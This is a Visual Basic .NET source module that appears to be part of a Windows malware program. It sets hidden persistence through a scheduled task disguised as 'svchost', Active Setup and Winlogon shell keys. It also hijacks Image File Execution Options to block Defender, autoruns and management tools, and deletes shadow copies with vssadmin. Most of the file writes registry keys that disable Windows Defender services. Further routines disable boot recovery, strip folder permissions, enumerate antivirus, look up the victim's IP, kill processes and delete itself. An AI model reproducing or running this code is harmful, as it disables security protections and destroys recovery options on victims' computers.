Option Explicit On
Imports System.Management
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports Microsoft.Win32

Module Module1
    Public WhatToRun As String = String.Empty
    Public RunFileAs As String = "EI#&*(R&USOKFDJLKDSJLFKJOWI"
    Public InstallationOfEverything As String

    Public Sub Registrys()
        Try
            Shell("schtasks /create /f /sc ONLOGON /RL HIGHEST /tn svchost /tr " + """'" & Application.ExecutablePath & "'""", AppWinStyle.Hide, False, -1)

            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components", GetRandomString(10), Application.ExecutablePath)
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components", GetRandomString(10), Application.ExecutablePath)
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler", GetRandomString(10), Application.ExecutablePath)
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler", GetRandomString(10), Application.ExecutablePath)
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionInfo\1\RunStuffHasBeenRun", GetRandomString(10), Application.ExecutablePath)
            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\<entries>", GetRandomString(10), Application.ExecutablePath)


            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc",
            "Debugger", "C:\Windows\System32\" + "MZ+V?&b?ZBceC&dx#c9-7${vZAWxtgm%YGDaLm9" + ".exe")

            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe",
            "Debugger", "C:\Windows\System32\" + "MqwbA84XXqwhAWVA#6cBA3.$h<VVxQ)6&Vw_§Es" + ".exe")

            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCleaner.exe",
            "Debugger", "C:\Windows\System32\" + "MqwbA84XXqwhAWVA#6cBA3.$h<VVxQ)6&Vw_§Es" + ".exe")

            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\autoruns.exe",
            "Debugger", "C:\Windows\System32\" + "MqwbA84XXqwhAWVA#6cBA3.$h<VVxQ)6&Vw_§Es" + ".exe")

            My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MsMpEng.exe",
            "Debugger", "C:\Windows\System32\" + "MqwbA84XXqwhAWVA#6cBA3.$h<VVxQ)6&Vw_§Es" + ".exe")


            Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
            Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
            Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)


            Dim RegistryKey As Object
            RegistryKey = CreateObject("WScript.Shell")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableRoutinelyTakingAction", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\ServiceKeepAlive", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\ServiceKeepAlive", 0, "REG_DWORD")


            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\DisableRoutinelyTakingAction", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\ProductStatus", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\Real-Time Protection\DisableAntiSpywareRealtimeProtection", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\Scan\AutomaticallyCleanAfterScan", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\Scan\ScheduleDay", 8, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\UX Configuration\AllowNonAdminFunctionality", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Defender\UX Configuration\DisablePrivacyMode", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\DisableRoutinelyTakingAction", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\ProductStatus", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\Real-Time Protection\DisableAntiSpywareRealtimeProtection", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\Scan\AutomaticallyCleanAfterScan", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\Scan\ScheduleDay", 8, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\UX Configuration\AllowNonAdminFunctionality", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows Defender\UX Configuration\DisablePrivacyMode", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WinDefend\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WinDefend\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WinDefend\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdBoot\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdBoot\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdBoot\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdFilter\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdFilter\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdFilter\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdNisDrv\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdNisDrv\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdNisDrv\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdNisSvc\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdNisSvc\Start", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdNisSvc\Start", 4, "REG_DWORD")

            RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\ForceUpdateFromMU", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\ForceUpdateFromMU", 0, "REG_DWORD")

            RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\UpdateOnStartUp", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates\UpdateOnStartUp", 0, "REG_DWORD")
            RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")

            RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")

            RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
            RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")

            Dim Fuckyou As RegistryKey
            Fuckyou = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", True)
            Fuckyou.SetValue("shell", "explorer.exe," & """" & Application.ExecutablePath & """")
            Fuckyou.Close()
        Catch ex As Exception
        End Try
    End Sub


    Public Sub Bypassrecovery()
        Dim os As String = My.Computer.Info.OSFullName.ToString
        If os.Contains("7") = True Then
            Try
                Shell("cmd.exe /k" + "reagentc /disable", AppWinStyle.Hide)
                Shell("cmd.exe /k" + "bcdedit /set {default} recoveryenabled No", AppWinStyle.Hide)
            Catch ex As Exception
            End Try
        ElseIf os.Contains("8") = True Then
            Try
                Shell("cmd.exe /k" + "reagentc.exe /disable", AppWinStyle.Hide)
                Shell("cmd.exe /k" + "bcdedit /set {default} recoveryenabled No", AppWinStyle.Hide)
            Catch ex As Exception
            End Try
        ElseIf os.Contains("Vista") = True Then
            Try
                Shell("cmd.exe /k" + "reagentc /disable", AppWinStyle.Hide)
                Shell("cmd.exe /k" + "bcdedit /set {default} recoveryenabled No", AppWinStyle.Hide)
            Catch ex As Exception
            End Try
        ElseIf os.Contains("10") = True Then
            Try
                Shell("cmd.exe /k" + "reagentc.exe /disable", AppWinStyle.Hide)
                Shell("cmd.exe /k" + "bcdedit /set {default} recoveryenabled No", AppWinStyle.Hide)
            Catch ex As Exception
            End Try

        End If
    End Sub


    Public Function IsAdmin() As Boolean
        Try
            Dim id As WindowsIdentity = WindowsIdentity.GetCurrent()

            Dim p As WindowsPrincipal = New WindowsPrincipal(id)

            Return p.IsInRole(WindowsBuiltInRole.Administrator)

        Catch
            Return False
        End Try

    End Function
    Public Sub KillFile(ByVal location As String) 'Completely Kill Files
        Try
            Dim FolderPath As String = location
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
            FolderAcl.SetAccessRuleProtection(True, False)
            FolderInfo.SetAccessControl(FolderAcl)
        Catch : End Try
    End Sub

    Function GetAntiVirus() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str = "AntiVirus: " & str.ToString
            Return str
            searcher.Dispose()
        Catch
            Return "AntiVirus: N/A"
        End Try
    End Function


#Region "get ip"
#Disable Warning
    Dim str2 As New System.Net.WebClient
    Public Function GETIPADRESS()



        Try
            Dim str5 As String = str2.DownloadString("https://api.ipify.org/")

            Return str5

        Catch ex As Exception
            'MsgBox("Error Please start me again.")
        End Try
    End Function
#End Region



    Private rand As New Random()
    Public Function GetRandomString(Optional ByVal len As Integer = 128)
        If len > 128 Then len = 128

        Static rndBuffer(256 - 1) As Byte
        rand.NextBytes(rndBuffer)
        Dim randomStr As String = String.Empty

        Using sha512crypto As New System.Security.Cryptography.SHA512CryptoServiceProvider()
            randomStr = String.Join("", Array.ConvertAll(Of Byte, String)(sha512crypto.ComputeHash(rndBuffer), Function(b As Byte) b.ToString("x2")))
        End Using
        Return randomStr.Substring(0, len)
    End Function





    Public Sub MeltFile()
        Dim info As New System.Diagnostics.ProcessStartInfo()
        Dim a As System.Reflection.Assembly = System.Reflection.Assembly.GetEntryAssembly()
        Dim self As String = System.IO.Path.GetFullPath(a.Location)
        info.CreateNoWindow = True
        info.UseShellExecute = False
        info.FileName = "cmd"
        info.Arguments = "/c ping google.com & del " & """"c & self & """"c
        System.Diagnostics.Process.Start(info)
        Application.Exit()
    End Sub

    Public Sub KillProcess(processName As String)
        Dim psi As ProcessStartInfo = New ProcessStartInfo
        psi.Arguments = "/im " & processName & " /f"
        psi.FileName = "taskkill"
        Dim p As Process = New Process()
        p.StartInfo = psi
        p.Start()
    End Sub
End Module
